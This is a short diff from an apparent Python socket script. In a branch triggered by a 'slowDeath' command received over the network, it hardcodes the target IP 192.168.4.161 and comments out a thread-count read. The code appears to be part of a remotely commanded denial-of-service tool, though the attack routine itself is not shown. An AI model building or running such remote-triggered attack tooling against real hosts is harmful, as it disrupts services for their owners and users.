@@ -91,7 +91,7 @@ try:
 	elif message == slowDeath:
 		ipAdd = soc.recv(1024)
 		ipAdd = '192.168.4.161'
-		threads = soc.recv(1024)
+		#threads = soc.recv(1024)
 		main(ipAdd)
 		
 
